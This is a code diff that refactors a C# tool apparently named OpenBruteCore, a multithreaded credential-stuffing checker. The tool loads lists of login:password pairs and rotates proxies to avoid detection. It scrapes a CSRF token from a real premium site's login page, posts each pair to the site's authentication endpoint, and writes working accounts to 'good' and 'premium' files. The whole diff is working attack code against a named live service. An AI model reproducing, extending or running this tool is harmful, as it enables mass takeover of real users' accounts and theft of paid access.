@@ -1,22 +1,18 @@
 ﻿using Leaf.xNet;
 using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Security.Authentication;
-using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace OpenBruteCore
 {
     public class AllMechanic
     {
-        
-        public static object accLock = new object();
-        private static readonly object resultLock = new object();
+
+        private static readonly object _accLock = new object();
+        private static readonly object ResultLock = new object();
         public static void LoadSource()
         {
             try
@@ -29,14 +25,14 @@ namespace OpenBruteCore
                 };
                 if (FileDialog.ShowDialog() == DialogResult.OK)
                 {
-                    globalList.sourceList.Clear();
-                    foreach (String file in FileDialog.FileNames)
+                    GlobalList.sourceList.Clear();
+                    foreach (var file in FileDialog.FileNames)
                     {
-                        globalList.sourceList.AddRange(File.ReadAllLines(file));
+                        GlobalList.sourceList.AddRange(File.ReadAllLines(file));
                     }
-                    globalList.frm.lbSource.Text = globalList.sourceList.Count.ToString();
+                    GlobalList.frm.lbSource.Text = GlobalList.sourceList.Count.ToString();
                 }
-
+                FileDialog.Dispose();
             }
             catch (Exception ex)
             {
@@ -53,15 +49,17 @@ namespace OpenBruteCore
                     Filter = "Proxy (*.txt)|*.txt"
                 }; if (FileDialog.ShowDialog() == DialogResult.OK)
                 {
-                    globalList.proxyList.Clear();
-                    globalList.proxyList.AddRange(File.ReadAllLines(FileDialog.FileName));
-                    globalList.frm.lbProxy.Text = globalList.proxyList.Count.ToString();
+                    GlobalList.ProxyList.Clear();
+                    GlobalList.ProxyList.AddRange(File.ReadAllLines(FileDialog.FileName));
+                    GlobalList.frm.lbProxy.Text = GlobalList.ProxyList.Count.ToString();
                 }
+                FileDialog.Dispose();
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.ToString(), "Error with loading proxy file !", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+
         }
 
         public static void RefreshProxy()
@@ -71,12 +69,12 @@ namespace OpenBruteCore
                 try
                 {
                     req.AllowAutoRedirect = false;
-                    string list = req.Get(globalList.proxyUrl).ToString();
+                    string list = req.Get(GlobalList.proxyUrl).ToString();
                     string[] Proxies = list.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
-                    globalList.proxyList.Clear();
+                    GlobalList.ProxyList.Clear();
                     foreach (string value in Proxies)
                     {
-                        globalList.proxyList.Add(value.Trim());
+                        GlobalList.ProxyList.Add(value.Trim());
                     }
                 }
                 catch
@@ -89,33 +87,32 @@ namespace OpenBruteCore
 
         public static void StartWork()
         {
-            if (globalList.proxyList.Count == 0)
+            if (GlobalList.ProxyList.Count == 0)
             {
                 MessageBox.Show("Proxy list is clear! Load proxies!", "Error at start", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
-            else if (globalList.sourceList.Count == 0)
+            else if (GlobalList.sourceList.Count == 0)
             {
                 MessageBox.Show("Source list is clear! Load source!", "Error at start", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
             else
             {
-                globalList.worck = true;
-                Thread th;
-                globalList.threadList.Clear();
-                for (int thrcount = 0; thrcount < globalList.thCount; thrcount++)
+                GlobalList.worck = true;
+                GlobalList.threadList.Clear();
+                for (int thrcount = 0; thrcount < GlobalList.thCount; thrcount++)
                 {
 
-                    th = new Thread(MainWorcher)
+                    var th = new Thread(MainWorcher)
                     {
                         IsBackground = false,
                         Priority = ThreadPriority.Highest
                     };
-                    globalList.threadList.Add(th);
+                    GlobalList.threadList.Add(th);
                     th.Start();
                 }
 
             }
-            
+
 
         }
 
@@ -123,19 +120,19 @@ namespace OpenBruteCore
 
         private static void MainWorcher()
         {
-            while (globalList.worck)
+            while (GlobalList.worck)
             {
                 try
                 {
                     string acc = string.Empty;
                     string login = string.Empty;
                     string pass = string.Empty;
-                    lock (AllMechanic.accLock)
+                    lock (AllMechanic._accLock)
                     {
-                        if (globalList.sourceList.Count > 0)
+                        if (GlobalList.sourceList.Count > 0)
                         {
-                            acc = globalList.sourceList[0];
-                            globalList.sourceList.RemoveAt(0);
+                            acc = GlobalList.sourceList[0];
+                            GlobalList.sourceList.RemoveAt(0);
                         }
                         else
                         {
@@ -172,141 +169,149 @@ namespace OpenBruteCore
 
         private static void DataResult(string result, string acc)
         {
-            lock (resultLock)
+            lock (ResultLock)
             {
                 string file;
-                if (result == "goodbal")
+                switch (result)
                 {
-                    file = Path.Combine(globalList.folderName, "Premium.txt");
-                    if (!Directory.Exists(globalList.folderName))
-                        Directory.CreateDirectory(globalList.folderName);
-                    File.AppendAllText(file, acc + "\r\n");
-                    globalList.good++;
-                }
-                if (result == "good")
-                {
-                    file = Path.Combine(globalList.folderName, "good.txt");
-                    if (!Directory.Exists(globalList.folderName))
-                        Directory.CreateDirectory(globalList.folderName);
-                    File.AppendAllText(file, acc + "\r\n");
-                    globalList.good++;
-                }
-                if (result == "bad")
-                {
-                    globalList.bad++;
-                }
-                if (result == "error")
-                {
-                    globalList.sourceList.Add(acc);
-                    globalList.error++;
-                }
-                if (result == "projecterror")
-                {
-                    file = Path.Combine(globalList.folderName, "projectError.txt");
-                    if (!Directory.Exists(globalList.folderName))
-                        Directory.CreateDirectory(globalList.folderName);
-                    File.AppendAllText(file, acc + "\r\n");
-                    globalList.projecterror++;
-                }
-                if (result == "corerror")
-                {
-                    file = Path.Combine(globalList.folderName, "coreError.txt");
-                    if (!Directory.Exists(globalList.folderName))
-                        Directory.CreateDirectory(globalList.folderName);
-                    File.AppendAllText(file, acc + "\r\n");
-                    globalList.corerror++;
-                }
+                    case "goodbal":
+                    {
+                        file = Path.Combine(GlobalList.folderName, "premium.txt");
+                        if (!Directory.Exists(GlobalList.folderName))
+                            Directory.CreateDirectory(GlobalList.folderName);
+                        File.AppendAllText(file, acc + "\r\n");
+                        GlobalList.good++;
+                        break;
+                    }
 
+                    case "good":
+                    {
+                        file = Path.Combine(GlobalList.folderName, "good.txt");
+                        if (!Directory.Exists(GlobalList.folderName))
+                            Directory.CreateDirectory(GlobalList.folderName);
+                        File.AppendAllText(file, acc + "\r\n");
+                        GlobalList.good++;
+                        break;
+                    }
+
+                    case "bad":
+                        GlobalList.bad++;
+                        break;
+                    case "error":
+                        GlobalList.sourceList.Add(acc);
+                        GlobalList.error++;
+                        break;
+                    case "projecterror":
+                    {
+                        file = Path.Combine(GlobalList.folderName, "projectError.txt");
+                        if (!Directory.Exists(GlobalList.folderName))
+                            Directory.CreateDirectory(GlobalList.folderName);
+                        File.AppendAllText(file, acc + "\r\n");
+                        GlobalList.projecterror++;
+                        break;
+                    }
+
+                    case "corerror":
+                    {
+                        file = Path.Combine(GlobalList.folderName, "coreError.txt");
+                        if (!Directory.Exists(GlobalList.folderName))
+                            Directory.CreateDirectory(GlobalList.folderName);
+                        File.AppendAllText(file, acc + "\r\n");
+                        GlobalList.corerror++;
+                        break;
+                    }
+                }
             }
         }
 
-        public static void Checker(string login, string pass) {
-            
-                using (var request = new HttpRequest())
+        public static void Checker(string login, string pass)
+        {
+
+            using (var request = new HttpRequest())
+            {
+                try
                 {
-                    try
+
+
+                    string ip = Helper.GetProxy();
+
+                    request.Cookies = new CookieStorage();
+                    if (GlobalList.proxyType == "HTTPS")
+                        request.Proxy = HttpProxyClient.Parse(ip);
+                    if (GlobalList.proxyType == "SOCKS4")
+                        request.Proxy = Socks4ProxyClient.Parse(ip);
+                    if (GlobalList.proxyType == "SOCKS5")
+                        request.Proxy = Socks5ProxyClient.Parse(ip);
+
+                    request.UserAgent = Http.ChromeUserAgent();
+
+
+                    //CSRF
+                    string token = request.Get("https://rt.pornhubpremium.com/premium/login").ToString();
+                    Match match = Regex.Match(token, "token\" id=\"token\" value=\"(.*)\"");
+                    string csrf = match.Success ? match.Groups[1].Value : "Не найдено";
+
+
+
+
+                    request.SslProtocols = SslProtocols.Tls | SslProtocols.Tls12 | SslProtocols.Tls11;
+                    request.AllowAutoRedirect = false;
+                    request.ConnectTimeout = GlobalList.timeOut;
+                    request.AddHeader("X-Requested-With", "XMLHttpRequest");
+                    request.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
+                    request.KeepAlive = true;
+
+
+                    string PostData = "username=" + login + "&password=" + pass + "&token=" + csrf + "&redirect=&from=pc_premium_login&segment=straight";
+
+                    //string json = "{\"username\":\""+login+"\",\"password\":\""+pass+"\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}";
+                    string content = request.Post("https://rt.pornhubpremium.com/front/authenticate", PostData, "application/x-www-form-urlencoded").ToString();
+
+                    //metroTextBox2.Text = content;
+
+                    if (content.Contains("success\":\"0"))
                     {
-
-
-                        string ip = Class.Helper.GetProxy();
-
-                        request.Cookies = new CookieStorage();
-                        if (globalList.proxyType == "HTTPS")
-                            request.Proxy = HttpProxyClient.Parse(ip);
-                        if (globalList.proxyType == "SOCKS4")
-                            request.Proxy = Socks4ProxyClient.Parse(ip);
-                        if (globalList.proxyType == "SOCKS5")
-                            request.Proxy = Socks5ProxyClient.Parse(ip);
-
-                        request.UserAgent = Http.ChromeUserAgent();
-
-
-                        //CSRF
-                        string token = request.Get("https://rt.pornhubpremium.com/premium/login").ToString();
-                        Match match = Regex.Match(token, "token\" id=\"token\" value=\"(.*)\"");
-                        string csrf = match.Success ? match.Groups[1].Value : "Не найдено";
-
-
-
-
-                        request.SslProtocols = SslProtocols.Tls | SslProtocols.Tls12 | SslProtocols.Tls11;
-                        request.AllowAutoRedirect = false;
-                        request.ConnectTimeout = globalList.timeOut;
-                        request.AddHeader("X-Requested-With", "XMLHttpRequest");
-                        request.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
-                        request.KeepAlive = true;
-
-
-                        string PostData = "username=" + login + "&password=" + pass + "&token=" + csrf + "&redirect=&from=pc_premium_login&segment=straight";
-
-                        //string json = "{\"username\":\""+login+"\",\"password\":\""+pass+"\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}";
-                        string content = request.Post("https://rt.pornhubpremium.com/front/authenticate", PostData, "application/x-www-form-urlencoded").ToString();
-
-                        //metroTextBox2.Text = content;
-
-                        if (content.Contains("success\":\"0"))
-                        {
-                            DataResult("bad", login + ":" + pass);
-                        }
-                        else if (content.Contains("success\":\"1"))
-                        {
-                           DataResult("good", "+++++++++++++++++\r\n" + login + ":" + pass + "\r\n+++++++++++++++++\r\n");
-                        }
-                        else if (content.Contains("<html><head><script type=\"text/javascript\">"))
-                        {
-                            DataResult("bad", login + ":" + pass);
-                        }
-                        else
-                        {
-                            DataResult("projecterror", login + ":" + pass + "{" + request.Response.ToString() + "}");
-                        }
-
+                        DataResult("bad", login + ":" + pass);
                     }
-                    catch (HttpException)
+                    else if (content.Contains("success\":\"1"))
                     {
-                        DataResult("error", login + ":" + pass);
+                        DataResult("good", "+++++++++++++++++\r\n" + login + ":" + pass + "\r\n+++++++++++++++++\r\n");
+                    }
+                    else if (content.Contains("<html><head><script type=\"text/javascript\">"))
+                    {
+                        DataResult("bad", login + ":" + pass);
+                    }
+                    else
+                    {
+                        DataResult("projecterror", login + ":" + pass + "{" + request.Response.ToString() + "}");
                     }
 
-                    catch (Exception ex)
-                    {
-
-                        DataResult("corerror", login + ":" + pass + "{" + ex.Message + "}");
-                        // MessageBox.Show(ex.ToString());
-                    }
-                    finally
-                    {
-
-                        request?.Dispose();
-                    }
                 }
-            
+                catch (HttpException)
+                {
+                    DataResult("error", login + ":" + pass);
+                }
+
+                catch (Exception ex)
+                {
+
+                    DataResult("corerror", login + ":" + pass + "{" + ex.Message + "}");
+                    // MessageBox.Show(ex.ToString());
+                }
+                finally
+                {
+
+                    request?.Dispose();
+                }
+            }
+
         }
 
 
         public static void StopWork()
         {
-            globalList.workStatus = "nothing";
-            foreach (Thread thread in globalList.threadList)
+            GlobalList.workStatus = "nothing";
+            foreach (Thread thread in GlobalList.threadList)
             {
                 thread.Abort();
             }
